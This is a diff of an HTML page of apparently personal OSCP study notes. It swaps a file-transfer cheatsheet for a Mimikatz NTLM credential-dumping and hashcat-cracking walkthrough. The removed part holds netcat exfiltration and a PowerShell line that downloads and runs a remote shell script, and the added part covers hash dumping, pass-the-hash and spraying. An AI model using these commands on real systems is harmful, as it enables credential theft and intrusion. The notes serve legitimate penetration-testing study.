@@ -3,12 +3,13 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>File Transfer - OSCP Notes</title>
+    <title>Web Fuzzing - AD Notes</title>
     <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
 
+    <!-- NAVBAR -->
     <nav>
         <a href="index.html">Home</a>
 
@@ -107,226 +108,229 @@
         <button id="toggle-results" onclick="toggleSearchResults()">▲</button>
         <div id="search-results" class="search-results collapsed"></div>
     </div>
-    <div class="container">
+    <!-- CONTENT -->
+   <div class="container">
 
-        <h1>File Transfer Cheatsheet (Kali ↔ Windows / Linux)</h1>
+    <h1>NTLM Credential Dumping & Cracking (OSCP Style)</h1>
 
-        <div class="section">
-            <div class="section-header">1. Kali → Windows (HTTP Method)</div>
-            <div class="section-content">
+    <!-- 1 -->
+    <div class="section">
+        <div class="section-header">1. Identify Users</div>
+        <div class="section-content">
 
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>python3 -m http.server 80</code></pre>
-
-                <p><strong>On Windows:</strong></p>
-
-                <pre><code>certutil -urlcache -split -f http://KALI_IP/file.exe file.exe</code></pre>
-
-                <pre><code>iwr http://KALI_IP/file.exe -OutFile file.exe</code></pre>
-
-                <pre><code>powershell -c "(New-Object Net.WebClient).DownloadFile('http://KALI_IP/file.exe','file.exe')"</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">2. Kali → Windows (SMB Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>impacket-smbserver share . -smb2support -username kali -password kali</code></pre>
-
-                <p><strong>On Windows:</strong></p>
-
-                <pre><code>net use \\KALI_IP\share /user:kali kali
-copy file.exe \\KALI_IP\share\</code></pre>
-
-                Or download from share:
-
-                <pre><code>copy \\KALI_IP\share\file.exe file.exe</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">3. Windows → Kali (Netcat Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>nc -lvnp 9001 > file.exe</code></pre>
-
-                <p><strong>On Windows:</strong></p>
-
-                <pre><code>nc KALI_IP 9001 &lt; file.exe</code></pre>
-
-                If no nc on Windows:
-
-                <pre><code>type file.exe | nc KALI_IP 9001</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">4. Kali → Linux (HTTP Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>python3 -m http.server 80</code></pre>
-
-                <p><strong>On Linux victim:</strong></p>
-
-                <pre><code>wget http://KALI_IP/file.sh
-curl http://KALI_IP/file.sh -o file.sh</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">5. Linux → Kali (Netcat Method)</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>nc -lvnp 9001 > file.txt</code></pre>
-
-                <p><strong>On Linux victim:</strong></p>
-
-                <pre><code>nc KALI_IP 9001 &lt; file.txt</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">6. SCP (If SSH Available)</div>
-            <div class="section-content">
-
-                <p><strong>From Kali to Linux:</strong></p>
-
-                <pre><code>scp file user@TARGET_IP:/tmp/</code></pre>
-
-                <p><strong>From Linux to Kali:</strong></p>
-
-                <pre><code>scp user@TARGET_IP:/tmp/file .</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">7. Base64 Transfer (When Nothing Works)</div>
-            <div class="section-content">
-
-                <p><strong>On victim:</strong></p>
-
-                <pre><code>base64 file.exe</code></pre>
-
-                Copy output manually.
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>base64 -d file.b64 > file.exe</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">8. PowerShell Encoded Download</div>
-            <div class="section-content">
-
-                <pre><code>powershell -enc BASE64COMMAND</code></pre>
-
-                Generate encoded command:
-
-                <pre><code>echo -n "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">9. FTP Quick Method</div>
-            <div class="section-content">
-
-                <p><strong>On Kali:</strong></p>
-
-                <pre><code>sudo python3 -m pyftpdlib -p 21</code></pre>
-
-                <p><strong>On victim:</strong></p>
-
-                <pre><code>ftp KALI_IP</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">10. OSCP Mental Quick Picks</div>
-            <div class="section-content">
-
-                <ul>
-                    <li>Have PowerShell? → iwr</li>
-                    <li>No PowerShell? → certutil</li>
-                    <li>Linux? → wget</li>
-                    <li>No tools? → base64</li>
-                    <li>Need exfiltration? → netcat</li>
-                    <li>SMB open? → impacket-smbserver</li>
-                </ul>
-
-            </div>
-        </div>
-        <div class="section">
-            <div class="section-header">11. Transfer Through Pivot (Ligolo / Tunnel)</div>
-            <div class="section-content">
-
-                <p>Cuando estás dentro de una red interna, NO puedes usar directamente tu IP de Kali.</p>
-
-                <p><strong>Solución:</strong> usar el túnel (ej: Ligolo)</p>
-
-                <p><strong>Ejemplo:</strong> descargar desde Kali a máquina interna</p>
-
-                <pre><code>wget http://ATTACKER_TUN_IP/file.sh
+            <pre><code>net user
+Get-LocalUser
 </code></pre>
 
-                <p>Tu IP será algo como:</p>
+            <p><strong>Qué buscas:</strong></p>
+            <ul>
+                <li>Usuarios no estándar</li>
+                <li>Service accounts</li>
+                <li>Users reutilizables para lateral movement</li>
+            </ul>
 
-                <pre><code>10.10.0.1 (interfaz ligolo)</code></pre>
-
-                <p><strong>Servidor en Kali:</strong></p>
-
-                <pre><code>python3 -m http.server 80 --bind 0.0.0.0
-</code></pre>
-
-            </div>
-        </div>
-
-        <div class="section">
-            <div class="section-header">12. Transfer Without Tools (Echo / Chunking)</div>
-            <div class="section-content">
-
-                <p>Cuando NO hay wget, curl, nc...</p>
-
-                <p><strong>En Kali:</strong></p>
-
-                <pre><code>base64 file.exe > file.b64
-</code></pre>
-
-                <p><strong>En víctima:</strong></p>
-
-                <pre><code>echo BASE64_PART >> file.b64
-</code></pre>
-
-                <p>Repetir por partes.</p>
-
-                <p><strong>Decodificar:</strong></p>
-
-                <pre><code>base64 -d file.b64 > file.exe
-</code></pre>
-
-            </div>
         </div>
     </div>
 
+    <!-- 2 -->
+    <div class="section">
+        <div class="section-header">2. Privilege Check</div>
+        <div class="section-content">
+
+            <pre><code>whoami /priv
+whoami /groups
+</code></pre>
+
+            <p><strong>Qué buscas:</strong></p>
+            <ul>
+                <li>SeDebugPrivilege → REQUIRED for Mimikatz</li>
+                <li>Admin / elevated context</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 3 -->
+    <div class="section">
+        <div class="section-header">3. Run Mimikatz</div>
+        <div class="section-content">
+
+            <pre><code>.\mimikatz.exe
+</code></pre>
+
+            <p><strong>Initial setup:</strong></p>
+
+            <pre><code>privilege::debug
+token::elevate
+</code></pre>
+
+            <p><strong>Qué hace:</strong></p>
+            <ul>
+                <li><code>privilege::debug</code> → habilita SeDebugPrivilege</li>
+                <li><code>token::elevate</code> → obtiene token SYSTEM</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 4 -->
+    <div class="section">
+        <div class="section-header">4. Dump NTLM Hashes (SAM)</div>
+        <div class="section-content">
+
+            <pre><code>lsadump::sam
+</code></pre>
+
+            <p><strong>Qué buscas:</strong></p>
+            <ul>
+                <li>NTLM hashes de usuarios locales</li>
+                <li>Usuarios no default (ej: nelly)</li>
+                <li>Hashes reutilizables o crackeables</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 5 -->
+    <div class="section">
+        <div class="section-header">5. Dump Live Credentials (Optional)</div>
+        <div class="section-content">
+
+            <pre><code>sekurlsa::logonpasswords
+</code></pre>
+
+            <p><strong>Qué buscas:</strong></p>
+            <ul>
+                <li>Plaintext passwords (si disponibles)</li>
+                <li>NTLM hashes en memoria</li>
+                <li>Kerberos tickets</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 6 -->
+    <div class="section">
+        <div class="section-header">6. Extract NTLM Hash</div>
+        <div class="section-content">
+
+            <p>Copia el hash del usuario objetivo:</p>
+
+            <pre><code>3ae8e5f0ffabb3a627672e1600f1ba10
+</code></pre>
+
+            <p>Guárdalo en un archivo:</p>
+
+            <pre><code>echo 3ae8e5f0ffabb3a627672e1600f1ba10 > user.hash
+</code></pre>
+
+            <p><strong>Importante:</strong></p>
+            <ul>
+                <li>No añadir espacios ni saltos extra</li>
+                <li>Formato limpio = necesario para cracking</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 7 -->
+    <div class="section">
+        <div class="section-header">7. Identify Hash Type</div>
+        <div class="section-content">
+
+            <pre><code>hashcat --help | grep -i ntlm
+</code></pre>
+
+            <p><strong>Resultado:</strong></p>
+            <ul>
+                <li>NTLM → mode 1000</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 8 -->
+    <div class="section">
+        <div class="section-header">8. Crack NTLM Hash</div>
+        <div class="section-content">
+
+            <pre><code>hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+</code></pre>
+
+            <p><strong>Qué hace:</strong></p>
+            <ul>
+                <li>Usa wordlist + rules (mutations)</li>
+                <li>Intenta encontrar password en keyspace</li>
+                <li>Más potente que brute-force puro</li>
+            </ul>
+
+            <p><strong>Output esperado:</strong></p>
+
+            <pre><code>HASH:password
+</code></pre>
+
+        </div>
+    </div>
+
+    <!-- 9 -->
+    <div class="section">
+        <div class="section-header">9. Validate Credentials</div>
+        <div class="section-content">
+
+            <p>Probar credenciales en servicios:</p>
+
+            <pre><code>RDP
+SMB
+WinRM
+SSH
+</code></pre>
+
+            <p><strong>Qué buscas:</strong></p>
+            <ul>
+                <li>Acceso exitoso</li>
+                <li>Privilegios del usuario</li>
+                <li>Posible escalada o lateral movement</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- 10 -->
+    <div class="section">
+        <div class="section-header">10. If Cracking Fails</div>
+        <div class="section-content">
+
+            <ul>
+                <li>Try password reuse across services</li>
+                <li>Use Pass-the-Hash instead of cracking</li>
+                <li>Try different wordlists (seclists, custom leaks)</li>
+                <li>Use different rule sets</li>
+                <li>Consider password spraying if multiple users exist</li>
+            </ul>
+
+        </div>
+    </div>
+
+    <!-- FLOW -->
+    <div class="section">
+        <div class="section-header">OSCP Attack Flow</div>
+        <div class="section-content">
+
+            <ol>
+                <li>Enumerate users</li>
+                <li>Gain admin privileges</li>
+                <li>Dump SAM / LSASS with Mimikatz</li>
+                <li>Extract NTLM hashes</li>
+                <li>Crack with Hashcat</li>
+                <li>Validate credentials</li>
+                <li>If not crackable → Pass-the-Hash</li>
+            </ol>
+
+        </div>
+    </div>
+
+</div>
+    <!-- SCRIPT -->
     <script>
         document.querySelectorAll(".section-header").forEach(h => {
             h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
